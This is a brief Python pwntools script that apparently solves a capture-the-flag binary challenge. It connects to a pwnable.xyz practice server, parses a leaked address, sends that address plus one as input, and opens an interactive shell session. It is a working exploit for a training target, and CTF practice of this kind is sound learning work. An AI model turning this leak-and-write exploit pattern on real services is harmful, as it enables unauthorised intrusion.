from pwn import *

#context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./challenge")
else:
    #PORT = int(input("PORT: "))
    #HOST = int(input("HOST: "))
    #p = remote("host"+str(HOST)+".dreamhack.games", PORT)
    p = remote("svc.pwnable.xyz", 30000)

elf = ELF("./challenge")


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


p.recvuntil("Leak: ")
leak = int(p.recvn(14), 16)
p.sendlineafter("message: ", str(leak + 1))
p.sendlineafter("message: ", b"1")

p.interactive()
